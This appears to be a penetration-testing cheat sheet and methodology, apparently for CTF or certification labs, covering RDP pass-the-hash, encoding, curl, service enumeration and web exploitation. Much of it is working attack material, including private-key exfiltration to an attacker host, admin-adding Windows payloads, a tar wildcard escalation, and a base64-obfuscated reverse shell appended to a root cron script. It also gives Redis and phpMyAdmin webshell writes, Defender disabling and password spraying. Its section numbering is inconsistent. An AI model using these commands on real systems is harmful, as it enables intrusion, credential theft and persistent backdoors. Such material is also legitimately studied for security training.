21.4 Connect to RDP

Connect to Windows RDP using credentials, hashes, or GUI prompts — and how to enable RDP when it is off. Pass-the-hash only works when NLA is disabled (UserAuthenticationRequired = 0).

Method Tool NLA Required Supports PTH Use Case
Credentials (user/pass) xfreerdp /u: /p: /v: Yes/No No Standard authenticated access
Pass-the-hash xfreerdp /u: /H: /v: Must be disabled Yes NTLM hash from secretsdump/mimikatz
Restricted Admin PTH xfreerdp /restricted-admin /u: /H: /v: Yes (NLA OK) Yes Newer Windows with Restricted Admin Mode enabled
GUI credential prompt rdesktop <IP> No No Relay / capture attacks needing a real login dialog
Enable RDP (registry) PowerShell Set-ItemProperty N/A N/A RDP disabled on target; requires existing shell as admin 
# xfreerdp — credentials
xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop
xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/home/[your_username]/Desktop

# xfreerdp — pass-the-hash
xfreerdp /size:1920x1080 /v:[IP] /u:[user] /H:[hash] /cert:ignore /dynamic-resolution
# rdesktop — GUI credential prompt
rdesktop [IP]
rdesktop [IP] -u [user] -p [password] -g 80%+150+100
# Check / toggle RDP NLA status
$ComputerName = hostname
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
# 1 = NLA required; 0 = disabled

# Disable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

# Re-enable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)

# Enable RDP system-wide
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

# Add user to Remote Desktop Users — local
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "[username]"

# Add user to Remote Desktop Users — AD
Add-ADGroupMember -Identity "Remote Desktop Users" -Members "[domain]\[username]"
net localgroup "Remote Desktop Users" "[domain]\[username]" /add

# Enable firewall rule
Get-NetFirewallRule -DisplayGroup "Remote Desktop"
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Create a new AD user for RDP
New-ADUser -Name "[username]" -AccountPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force) -Enabled $true
Get-NetUser | select cn
Add-ADGroupMember -Identity "Remote Management Users" -Members [username]
Add-ADGroupMember -Identity "Administrators" -Members [username]
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

21.5 Decoding Techniques

Encode and decode common data formats from the command line. Try base64 -d first on any opaque string; garbage output means it is not base64. PowerShell uses UTF-16LE base64 — decode with base64 -d | iconv -f UTF-16LE -t UTF-8.

Encoding Type Visual Signature Encode Command Decode Command Common Use
Base64 A–Z a–z 0–9 + / with = padding echo "text" | base64 echo "b64" | base64 -d JWT, PS payloads, config files, cookies
Base64 (UTF-16LE / PowerShell) Long base64 string from -EncodedCommand iconv -t UTF-16LE | base64 -w0 base64 -d | iconv -f UTF-16LE PowerShell encoded command payloads
Hexadecimal 0–9 a–f only, even length echo "text" | xxd -p | tr -d '\n' echo "hex" | xxd -r -p Shellcode, binary blobs, hash representation
URL encoding %XX sequences python3 -c "import urllib.parse; print(urllib.parse.quote('...'))" python3 -c "import urllib.parse; print(urllib.parse.unquote('...'))" Web request parameters, log analysis, injection crafting
ROT13 Readable words shifted by 13 letters echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m' echo "rot" | tr 'A-Za-z' 'N-ZA-Mn-za-m' CTF obfuscation, simple config masking
Reverse string Backwards-readable text echo "text" | rev echo "txet" | rev Trivial obfuscation, CTF flags
ASCII decimal Space-separated integers 32–126 echo -n "text" | od -An -t uC | tr -d ' \n' echo "72 101 ..." | awk '{for(i=1;i<=NF;i++) printf("%c",$i)}' Obfuscated payloads, CTF encoding challenges 
# ASCII decimal decode
echo "72 101 108 108 111" | awk '{for(i=1;i<=NF;i++) printf("%c",$i)}'

# ASCII decimal encode
echo -n "Hello" | od -An -t uC | tr -d ' \n'
# Base64 decode
echo "SGVsbG8gd29ybGQ=" | base64 -d

# Base64 encode
echo "Hello world" | base64
# Hex decode
echo "48656c6c6f20776f726c64" | xxd -r -p

# Hex encode
echo "Hello world" | xxd -p
# Reverse decode
echo "dlrow olleH" | rev

# Reverse encode
echo "Hello world" | rev
# ROT13 decode
echo "Uryyb jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# ROT13 encode
echo "Hello world" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# URL decode
echo "Hello%20World%21" | python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read().strip()))"

# URL encode
echo "Hello World!" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))"

21.6 Curl Usage

Common curl flags for HTTP interaction during testing. Pipe output to jq or python3 -m json.tool for readable JSON responses.

# GET
curl http://example.com

# GET with custom header
curl -H "Accept: application/json" http://example.com
# POST with form data
curl -X POST -d "param1=value1&param2=value2" http://example.com/submit

# POST with JSON
curl -H "Content-Type: application/json" -X POST -d '{"key1":"value1", "key2":"value2"}' http://example.com/api

# POST with automatic URL encoding
curl -X POST -d "param1=value1&param2=value2" --data-urlencode http://example.com/submit

# PUT
curl -X PUT -d "param1=value1&param2=value2" http://example.com/update

# DELETE
curl -X DELETE http://example.com/delete
# Basic auth
curl -u username:password http://example.com

# Custom User-Agent
curl -A "CustomUserAgent/1.0" http://example.com
# Include response headers
curl -i http://example.com

# Response headers only
curl -I http://example.com

# Save response body to file
curl -o filename.html http://example.com

# Silent — body only
curl -s http://example.com

# Verbose — full request/response detail
curl -v http://example.com
# Send cookies inline
curl -b "cookie1=value1; cookie2=value2" http://example.com

# Save cookies to file
curl -c cookies.txt http://example.com

# Load cookies from file
curl -b cookies.txt http://example.com
# Upload a file
curl -F "file=@path/to/file" http://example.com/upload

# Download with resume support
curl -C - -o filename http://example.com/file
# Route through a proxy (e.g. Burp)
curl -x http://proxyserver:port http://example.com

# Ignore SSL certificate errors
curl -k https://example.com

# Follow redirects
curl -L http://example.com

# Set timeout (seconds)
curl --max-time 30 http://example.com

# Print only HTTP response code
curl -s -o /dev/null -w "%{http_code}" http://example.com

# Force HTTP/2
curl --http2 http://example.com

21.7 Generate a SSH Key

Generate an SSH key pair on the victim, exfiltrate the private key, and connect back. Alternatively, append your attacker public key to ~/.ssh/authorized_keys directly.

# 1. Generate key pair on victim
ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ''

# 2. Start web server on attacker
python3 -m http.server 80

# 3. Upload private key to attacker (run on victim)
curl -T /tmp/id_rsa http://<attacker_ip>/id_rsa

# 4. Clean up from victim
rm /tmp/id_rsa /tmp/id_rsa.pub

# 5. Fix permissions on attacker
chmod 600 id_rsa

# 6. Connect
ssh -i id_rsa user@<victim_ip>

21.8 Cross Compiling for Windows

Use mingw on Kali to compile C payloads into Windows executables or DLLs. Install with sudo apt install mingw-w64. Use -static to bundle the runtime and -s to strip debug symbols.

/* adduser.c — executable: adds a local admin user */
#include <stdlib.h>

int main ()
{
  system("net user emma Password123! /add");
  system("net localgroup administrators emma /add");
  return 0;
}
/* adduser.c — DLL variant: same payload triggered on DLL_PROCESS_ATTACH */
#include <windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
      system("net user emma Password123! /add");
      system("net localgroup administrators emma /add");
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}
# Cross-compile to 64-bit executable
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Cross-compile to DLL
x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows

21.9 Managing Flags

Locate and retrieve proof flags correctly — flags must be submitted from an interactive shell. Screenshot evidence must show flag content, hostname, IP, and current user in a single frame.

# Find local flag location
find / -type f -name local.txt 2>/dev/null

# Retrieve flags — Linux (interactive shell required)
hostname && whoami && cat proof.txt && ip a

# Retrieve flags — Windows (interactive shell required)
hostname && whoami && type [local/proof].txt && ipconfig /all

21.10 Additional Tips

Miscellaneous commands useful across different phases — UID/GID manipulation for NFS access, cron wildcard injection, persistent shell upgrades via writable scripts, and process monitoring for hidden scheduled tasks.

# File ownership and permissions
ls -l id_rsa
sudo chown <new_owner> <file_name>
sudo usermod -aG <group_name> <username>
sudo groupadd -g <gid> <group_name>
sudo useradd -u <uid> -g <gid> <username>
sudo passwd <username>
# File metadata and hash identification
exiftool -a -u [file.extension]
hashid [hash]
# PATH variable — Linux
export PATH="$PATH:/usr/local/bin:/usr/bin:/bin"
# Save a private key over an unstable shell
echo "-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY-----" > /tmp/id_rsa
# Search for passwords in PHP files
find [directoryPath] -maxdepth 5 -name "*.php" -exec grep -Hni "password" {} \; 2>/dev/null
# Tar wildcard injection — escalate via cron running tar as root
cd /tmp
echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > payload.sh
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
sudo /bin/bash
# Upgrade to root via writable root-owned script
echo -n "chmod u+s /bin/bash" | base64
echo "echo -n 'Y2htb2QgdStzIC9iaW4vYmFzaA=='|base64 -d|bash" >> /var/backups/etc_Backup.sh
# Wait for root execution, then:
/bin/bash -p

# Alternative — reverse shell payload
echo -n "sh -i >& /dev/tcp/$KaliIP/80 0>&1" | base64
echo "echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMQ=='|base64 -d|bash" >> /var/backups/etc_Backup.sh
# Linux enumeration
find / -name "<FILE>"
netstat -lntp
find / -perm -4000 2>/dev/null     # list all SUID files
cat /etc/issue
uname -a
ps -faux
# Windows file search
Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue
Dir -Hidden
Dir -Force
dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Disable Windows Defender
sc stop WinDefend

# Bypass execution policy
powershell -nop -ep bypass

# Find a file (cmd)
dir /a
dir /b/s "<FILE>"

22. Methodology

Enumerate before you exploit. Move through: scan → enumerate → research → exploit, exhausting each stage before advancing.

22.1 Services

Apply this checklist to every open port: scan, enumerate, research, attempt access.

22.1.1 Initial Scanning

  • Nmap Advanced Enumeration for each service
  • Make a List of Every Entry Point

22.1.2 General Methodology

  • Enumerate:
    • Banner Grabbing
      • Netcat: nc -v [ip] [port]
      • Telnet: telnet [ip] [port]
    • Version
    • Vulnerabilities: banner grab with Netcat or Telnet
    • Use HackTricks if you don't know how to enumerate a service
  • Consider:
    • Service purpose: is it readable / modifiable / decryptable?
    • Can we change passwords or users from other services?
    • Can we modify information?
    • Can we read information?
    • Can we decrypt it?
    • Default credentials and brute-force possibilities
  • Brute-Force:
    • Default credentials: use creds (pip3 install defaultcreds-cheat-sheet)
    • NSE Scripts — --script brute category covers FTP, SSH, HTTP, SMB, and more
    • Hydra
  • Known vulnerabilities and misconfigurations:
    • exploit-db.com
    • cvedetails.com
    • nvd.nist.gov
    • Google:
      • site:github.com *Service version.release
      • version + github + exploit
      • Every error message
      • Every PATH
      • Every parameter to find version
      • Every version on ExploitDB
      • Every version vulnerability
      • Every string from the banner
  • Credentials:
    • Try popular credentials:
      • admin:admin
      • admin:password
      • root:admin
      • root:password
      • root:root
      • [boxname]:admin
      • [boxname]:password
      • [appName]:[appName]
      • admin:(no pass)
      • root:(no pass)
    • Try word variants: pass, passwd, pwd, user, usr, username, secret, cred, auth
    • Default credentials via creds tool
  • Code and Files Review:
    • DB credentials (MySQL, PostgreSQL, MSSQL): look for string sa
    • Office docs: office2john
    • EXEs:
      • strings
      • flare-floss — decodes obfuscated/stack strings
      • Buffer Overflow
    • JPGs:
      • wget to preserve original timestamps
      • Check for hidden content:
      • binwalk
      • strings
      • steghide (try empty passphrase first)
    • PCAPs: wireshark
    • PDFs:
      • exiftool
      • pdfcrack
    • PNGs: exiftool
    • ZIPs: zip2john
    • 7z: 7z2john
    • .NET: dnSpy — full decompilation to readable C#
    • Search Google for specific file type and decryption method:
      • Groups.xml: gpp-decrypt (GPP AES key is public)
      • VNC password file: vncpwd
    • Review configuration files and databases:
      • sqlite
      • .conf
      • .config
      • .xml

22.1.3 Specific Services Strategy

Per-service checks layered on top of the general methodology above.

Service Quick-Reference: First 3 Checks → Likely Foothold
Service Port(s) Check 1 Check 2 Check 3 Likely Foothold
FTP 21/tcp Anonymous login: ftp [ip] user anonymous Recursive download: wget -r ftp://[ip]/ Write to web root → upload webshell Shell via webshell or binary exploit
SMTP 25/tcp User enum: smtp-user-enum -M VRFY -U users.txt -t [ip] Banner grab for daemon version Searchsploit daemon name+version Username list for SSH/RDP brute-force; RCE if old Exim/Postfix
DNS 53/tcp+udp Zone transfer: dig axfr @[ip] [domain] Subdomain brute: gobuster dns Reverse lookup of all IPs Internal hostname list → new attack surface
Kerberos 88/tcp User enum: kerbrute userenum AS-REP roast: GetNPUsers.py Kerberoast: GetUserSPNs.py Crackable hash → domain credential
POP3 110/tcp Auth test: nc [ip] 110 → USER/PASS LIST then RETR all messages Brute-force with Hydra Cleartext creds in email body
RPC 135/tcp Null session: rpcclient -U "" -N [ip] enumdomusers enumdomgroups AD user list → spray / roast
SMB 445/tcp Null session: smbmap -H [ip] List + download: smbclient -N //[ip]/[share] Check MS17-010: nmap --script smb-vuln-ms17-010 SYSTEM shell (EternalBlue) or credential files in shares
SNMP 161/udp Community string brute: onesixtyone [ip] common.txt Walk MIB: snmpwalk -c public -v1 [ip] snmp-check [ip] for formatted output Running processes / user list / cleartext creds in MIB
LDAP 389/tcp Null bind: ldapsearch -x -H ldap://[ip] -b "dc=…" Dump all: ldapdomaindump [ip] Grep descriptions for passwords AD user/group list; plaintext password in description field
Redis 6379/tcp Unauthenticated connect: redis-cli -h [ip] INFO server KEYS * on all DBs Test write: CONFIG SET dir /var/www/html/ PHP webshell / SSH key write / cron RCE
Rsync 873/tcp List modules: rsync rsync://[ip]/ Download: rsync -av rsync://[ip]/[mod]/ /tmp/ Check write: rsync -av /tmp/test rsync://[ip]/[mod]/ SSH key plant or cron job write → shell
IRC 6667/tcp Connect + /version Check banner against ExploitDB Look for bot commands Backdoor RCE (UnrealIRCd) or info leak

19.1.3.1 FTP (with Null Session)

Anonymous login and write access to the web root are the two quick wins. Even read-only access may yield credentials or source code.

  • If unstable, reset the box
  • Banner Grabbing
  • Enumerate:
    • Version
    • Known Service Bugs
    • Find configuration issues
  • Google-Fu:
    • Every error message
    • Every URL path
    • Every parameter to find versions, apps, or bugs
  • Searchsploit every service
  • Google:
    • Every version in ExploitDB
    • Every version vulnerability
    • Every running service
  • Download:
    • All files recursively — wget -r ftp://[ip]/ or wget -r --ftp-user=anonymous --ftp-password='' ftp://[ip]/:
      • Crack password-protected files
      • exiftool for author names (usernames)
      • strings on binaries
  • Upload:
    • Switch to binary mode before uploading .exe or shell payloads
    • Identify FTP root path — e.g., /var/ftp/anon/; if it maps to the web root, upload a webshell and request it over HTTP
  • Check configuration files:
    • ftpusers — lists denied accounts; useful for user enumeration on other services
    • ftp.conf
    • proftpd.conf — may reference a SQL backend with a reusable connection string
    • FileZilla users.xml — stores accounts; sometimes in plaintext
  • dotdotpwn for path traversal

19.1.3.2 SMTP

Primarily useful for user enumeration via VRFY/EXPN/RCPT. Build a username list and use it everywhere else.

  • Use nmap and HackTricks for guidance
  • Enumerate users:
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t [ip]
# Check for open relay
nmap --script smtp-open-relay -p 25 [ip]
  • Google-Fu:
    • Every error message
    • Every URL path
    • Every parameter to find versions, apps, or bugs
  • Searchsploit every service
  • Google:
    • Every version in ExploitDB
    • Every version vulnerability
    • Every running service

19.1.3.3 DNS

A successful zone transfer gives the complete hostname/IP list — add all to /etc/hosts and re-enumerate.

  • Use autorecon or manual enumeration
  • nslookup and dig axfr:
dig axfr @[nameserver-ip] [domain]
# Subdomain brute-force when zone transfer fails
gobuster dns -d [domain] -r [ip] -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

19.1.3.4 Kerberos

Port 88 means Active Directory. Kerberoasting and AS-REP Roasting can yield crackable hashes with minimal or no prior credentials.

  • Enumerate with kerbrute — AS-REQ probes don't trigger lockout:
kerbrute userenum --dc [ip] -d [domain] users.txt
  • Kerberoasting — requires any valid domain credential; cracks TGS tickets for SPN accounts:
GetUserSPNs.py [domain]/[user]:[pass] -dc-ip [ip] -request
  • AS-REP Roasting — no credentials needed; targets accounts with pre-auth disabled (hashcat mode 18200):
GetNPUsers.py [domain]/ -dc-ip [ip] -usersfile users.txt -no-pass

19.1.3.5 POP3

Once authenticated, read every email — they routinely contain credentials, internal hostnames, or reset links.

  • Test authentication as a user — error message differences can confirm valid usernames:
nc [ip] 110
# then: USER [name]  /  PASS [password]
  • List and retrieve messages:
# LIST shows message numbers; RETR [n] downloads message n
LIST
RETR 1
  • Google-Fu:
    • Every error message
    • Every URL path
    • Every parameter to find versions, apps, or bugs
  • Searchsploit every service
  • Google:
    • Every version in ExploitDB
    • Every version vulnerability
    • Every running service

19.1.3.6 RPC (with Null Session)

A null session may enumerate users, groups, and printers without credentials — this user list feeds every subsequent attack.

  • Enumerate users with enumdomusers:
rpcclient -U "" -N [ip] -c "enumdomusers"
  • Enumerate printers and devices:
# Also try: querydominfo, enumdomgroups
rpcclient -U "" -N [ip] -c "enumprinters"

19.1.3.7 SMB (with Null Session)

A null/guest session may list shares, download files, and enable relay attacks or shell upload. Always check EternalBlue.

  • Download all files:
smbmap -H [ip]
smbclient //[ip]/[share] -N    # then: mget *
crackmapexec smb [ip] --shares -u "" -p ""
  • Mount shares for recursive grep:
mount -t cifs //[ip]/[share] /mnt/smb -o guest
  • Identify permissions with smbcacls; check if we can upload:
    • scf — triggers NTLM auth to Responder when a user browses the share
    • hta
    • odt
  • Google-Fu:
    • Every error message
    • Every URL path
    • Every parameter to find versions, apps, or bugs
  • Searchsploit every service
  • Google:
    • Every version in ExploitDB
    • Every version vulnerability
    • Every running service
  • Check for EternalBlue (MS17-010) — gives SYSTEM directly on unpatched Win7/2008R2+:
nmap --script smb-vuln-ms17-010 -p 445 [ip]
# Password spray — one pass per round avoids lockout
crackmapexec smb [ip] -u users.txt -p 'Password1' --continue-on-success

19.1.3.8 SNMP

Always scan UDP 161 explicitly — it's missed by default TCP scans. Default community string public often exposes processes, users, interfaces, and software.

  • UDP port scan and community string brute:
nmap -sU -p 161 [ip]
onesixtyone [ip] /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
  • Walk the MIB tree:
snmpwalk -c public -v1 [ip] | grep -i password
snmp-check [ip]
  • Enumerate:
    • Version
    • Known Service Bugs
    • Configuration issues — SNMPv1/v2c send community strings in cleartext
  • Google-Fu:
    • Every error message
    • Every URL path
    • Every parameter to find versions, apps, or bugs
  • Searchsploit every service
  • Google:
    • Every version in ExploitDB
    • Every version vulnerability
    • Every running service

19.1.3.9 LDAP (with Null Session)

An unauthenticated bind may return all AD users and computers, including description fields where admins sometimes store temporary passwords.

  • Search with ldapsearch — grep descriptions for keywords:
ldapsearch -x -H ldap://[ip] -b "dc=[domain],dc=[tld]" "(objectClass=person)" description | grep -i pass
  • Keywords to grep: unusual fields   pwd   Pwd   password   pass   Pass
  • ldapdomaindump — produces HTML/JSON reports of all AD users, groups, computers, GPOs:
ldapdomaindump [ip] -u '[domain]\[user]' -p [password]

19.1.3.10 Redis (with Null Session)

Redis frequently runs unauthenticated and can write arbitrary files — webshell, SSH key, or cron job.

  • Check HackTricks — connect first:
redis-cli -h [ip]
INFO server
  • Enumerate all databases:
CONFIG GET databases
SELECT [n]
KEYS *
  • PHP webshell if web root is writable:
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET x ""
SAVE
  • Write SSH authorized_keys (if running as root):
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa [your-pubkey]\n\n"
SAVE
  • Check all three RCE paths: webshell write, SSH key write, cron write to /etc/cron.d/
  • Upload module.so if version < 7.0 is vulnerable — enables direct command execution via MODULE LOAD
  • Get a reverse shell once RCE is confirmed

19.1.3.11 Rsync (with Null Session)

Unauthenticated rsync exposes named modules (shares); write access lets you plant SSH keys, cron jobs, or webshells.

  • List available modules:
rsync rsync://[ip]/
  • Download a module recursively:
rsync -av rsync://[ip]/[module]/ /tmp/rsync-loot/
  • Check rsyncd.conf in the downloaded share to identify the absolute path before attempting writes

19.1.3.12 IRC

CTF IRC servers often run vulnerable or backdoored daemons. Check the version against ExploitDB immediately.

  • Connect with hexchat, run /version and /list. UnrealIRCd 3.2.8.1 has a hardcoded backdoor — trigger with AB; followed by a command on any listening port.

22.2 Web

Work through these phases in order: scan → fingerprint → enumerate paths/params → exploit.

Web Testing Phases at a Glance
Phase Section Goal Primary Tools Key Output
Initial Scanning 19.2.1 Identify server, framework, and version nmap http-scripts, curl -I Server headers, tech stack, version string
Vulnerability Scanning 19.2.2 Broad automated coverage + proxy discovery nikto, spose.py Lead list of misconfigs and interesting paths
Source Inspection 19.2.3 Find credentials, hidden endpoints, API keys Browser DevTools, curl, html2markdown Hidden fields, comments with creds, JS API routes
User Enumeration 19.2.4 Build username and password wordlists username-anarchy, cewl Targeted user/pass lists for all auth surfaces
CMS / Stack Detection 19.2.5 Map version to known CVEs wpscan, droopescan, searchsploit CVE list; tech-specific exploit path
Tech-Specific Checks 19.2.6 Exploit known CMS/service weaknesses wpscan, cadaver, davtest, Metasploit Authenticated or unauth RCE; shell upload
Upload Enumeration 19.2.7 Find file-upload paths; test exec bypass Burp Repeater, curl Executable file upload → webshell
App Logic Analysis 19.2.8 Find auth bypass, 403 bypass, logic flaws Burp Suite, manual testing Privilege escalation via parameter tampering
Directory / File Enum 19.2.9 Discover hidden paths, LFI targets, config files gobuster, dirsearch, ffuf, dotdotpwn Admin panels, backup files, LFI/RFI params
Parameter Testing + SQLi 19.2.10 Confirm injection points; extract data or shell sqlmap, Burp Intruder, manual ' test DB credentials; xp_cmdshell / INTO OUTFILE RCE
Auth / Login Forms 19.2.11 Gain authenticated access hydra, wpscan, Burp Intruder, cewl Admin session → shell upload or privileged function

22.2.1 Initial Scanning

Collect version strings and server headers — do not interact with forms yet.

  • Nmap — note server headers and tech fingerprints:
    • Check for potential auth owner
    • Note application types (Node.js, Werkzeug, IIS, etc.)
    • Apache 2.4.49 — check CVE-2021-41773 path traversal / RCE:
nmap -sV -sC -p [port] --script http-headers,http-title,http-server-header [ip]
# CVE-2021-41773 — Apache 2.4.49 path traversal
curl "http://[ip]/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

22.2.2 Vulnerability Scanning

Run automated scanners early and let them work in the background. Treat output as leads — verify every finding manually.

  • Nikto scan:
nikto -h http://[ip]:[port]
  • Proxy enumeration (if applicable):
    • spose.py — probes which internal IPs/ports the proxy will forward to

22.2.3 Site Navigation and Source Code Inspection

Read the source of every unique page — developers leave credentials and API keys in HTML comments more often than expected.

  • Inspect source code for:
    • APIs — undocumented endpoints in JS often skip auth checks
    • href attributes
    • Comments — often contain TODO notes with credentials or internal paths
    • Hidden values — <input type="hidden"> may carry role flags or tokens
    • Odd or suspicious code
    • Passwords
    • Downloadable files (analyze with exiftool)
  • Analyze content with html2markdown:
curl -s http://[ip]/ | html2markdown

22.2.4 User Enumeration and Credential Gathering

Gather names from author fields, profile pages, and error message differences before building wordlists.

  • Enumerate:
    • Usernames
    • Emails
    • User info
  • Build a user list with username-anarchy and use it against every service:
username-anarchy "First Last" > users.txt
  • Build a passlist with cewl and try:
    • username:username
    • username:password
    • Variations: pass, passwd, pwd, user, usr, secret, cred, auth
cewl -d 3 -m 6 http://[ip] -w cewl.txt

22.2.5 CMS and Version Detection

A known CMS version maps directly to known CVEs — skip this and you'll waste time on irrelevant attack paths.

  • Always add the DNS address to /etc/hosts — virtual hosting may serve a different app by hostname
  • Identify CMS or version through:
    • About pages or visible version numbers
    • Searchsploit for CMS exploits
    • Service discovery for configuration issues
    • Find service and version
    • Find known service bugs
    • Find configuration issues
  • For PHP: check phpinfo.php — reveals web root path, PHP version, and extensions (critical for LFI-to-RCE):
# Look for: $_SERVER[CONTEXT_DOCUMENT_ROOT]
curl http://[ip]/phpinfo.php
  • Google-Fu — search every observable detail:
    • Every error message
    • Every URL path
    • Every parameter
    • Every version on ExploitDB
    • Every version vulnerability
    • Check error messages, URL paths, and parameters for relevant information
    • Searchsploit for identified services
    • Google known version exploits and vulnerabilities

22.2.6 Technology-Specific Checks

Work through the relevant checklist completely before declaring a technology safe.

  • Drupal
    • Droopescan for enumeration
    • Check /CHANGELOG.txt for exact installed version
    • Identify endpoint_path
    • Drupal 7.x Module Services RCE
    • Drupalgeddon2 (CVE-2018-7600) — unauthenticated RCE, Metasploit module: exploit/unix/webapp/drupal_drupalgeddon2
    • Drupalgeddon3 (CVE-2018-7602) — requires authenticated session
  • Jenkins
    • Check for default credentials; if that fails:
      • Try self-registration if sign-up page is accessible
      • If AD auth: try kerbrute, then Kerberoasting or AS-REP roasting
    • Identify version and exploits
    • Groovy Script console at /script for reverse shell
    • Create a new job:
      • Execute commands if buildable; otherwise use curl or cron
      • Attempt reverse shell
      • Hunt for master.key and hudson.util.Secret to decrypt stored credentials
  • phpMyAdmin
    • Try default credentials:
      • root:(empty)
      • root:password
    • Once authenticated, write a webshell via SQL — check phpinfo for exact web root path:
# SQL tab in phpMyAdmin
SELECT "" INTO OUTFILE '/var/www/html/shell.php'
  • Tomcat
    • Run Nikto scan
    • Search for vulnerabilities by version
    • Look for /manager/html and /manager/text
    • Try default credentials: tomcat:tomcat, admin:admin, tomcat:s3cret; check /conf/tomcat-users.xml if filesystem is accessible
    • Upload a WAR file for a reverse shell once access is obtained
  • WebDAV
    • Check for default credentials
    • Spray for other credentials
    • Use davtest to enumerate allowed upload extensions, then cadaver for file upload (e.g., ASPX)
  • WordPress
    • wpscan — enumerate vulnerable plugins:
wpscan --url http://[ip] --enumerate p,u,t --plugins-detection aggressive --api-token [token]
    • wpscan brute-force — admin access lets you add a PHP shell via Dashboard → Theme/Plugin editor:
wpscan --url http://[ip] -U [user] -P /usr/share/wordlists/rockyou.txt
  • SSTI candidates — Jinja2 (Flask), Twig (PHP), Smarty: test with {{7*7}} or ${7*7} in any rendered parameter; a 49 response confirms injection and is often a direct RCE path

22.2.7 Enumerate Upload Capabilities

File upload to an executable path is a direct code execution path. Always combine with FTP/Redis write vectors.

  • Identify allowed extensions — test .php, .php5, .phtml, .asp, .aspx, .jsp; try double extensions, null bytes, and MIME manipulation in Burp if filtered
  • Pair with FTP, Redis, and other upload-capable services — follow any write with a gobuster sweep of the likely destination
At this stage, consider the version and technology stack carefully. If no public exploit exists, the application was likely built by the box author — look hard for SQL injection and code injection, and ensure payloads match the target technology.

22.2.8 Application Logic and Security Analysis

When CVE paths are exhausted, think like a developer: what does the app trust that you can violate?

  • Apply logical reasoning:
    • Assess from a malicious perspective: what is valuable, what can be exploited?
    • Examine business logic — any client-controlled value the server acts on is a target
  • 401 or 403?
    • Attempt to bypass — common 403 bypasses: X-Original-URL: /admin, X-Rewrite-URL: /admin, path case variations, /%2fadmin, /.. prefix
    • HackTricks — a bypass script may be available
  • 404? Try these paths to detect tech stack from error message differences:
    • DoNotExist.php
    • DoNotExist.html
    • DoNotExist
  • Nikto results:
    • Google everything Nikto returns — every finding is a research starting point

22.2.9 Directory and File Enumeration

Run at least two wordlists — general and tech-specific. Re-enumerate every new directory found.

  • Enumerate directories:
    • dirsearch
    • gobuster:
gobuster dir -u http://[ip] -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak
    • Try /[boxName] paths
    • If /cgi-bin/ is found — any .sh, .cgi, .pl file is a Shellshock candidate:
      • Shellshock test:
nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
      • dirb scan against /cgi-bin/
      • Standard dirb scan
  • Rerun source inspection (19.2.3–19.2.5) for every newly discovered path
  • Enumerate hidden parameters:
    • wfuzz
    • ffuf:
ffuf -u http://[ip]/page.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs [baseline-size]
    • Guess parameters from context — e.g., GET /forgot_pass.php?email=%0aid
  • Test parameters for RFI and LFI — any ?page=, ?file=, ?include= param is a candidate:
    • Relative path techniques to expose other services
    • LFI-to-RCE paths: log poisoning, /proc/self/environ, PHP wrappers (php://input, php://filter, data://), session file injection
    • PHP filter chain RCE — php_filter_chain_generator achieves arbitrary PHP execution via LFI alone (no writable path needed)
    • dotdotpwn — automated path traversal fuzzer
  • Check configuration and metadata files:
    • robots.txt — Disallow: entries often point to admin panels or backup dirs
    • .svn — exposed directory allows full source code extraction
    • .DS_Store — leaks filenames and folder structure
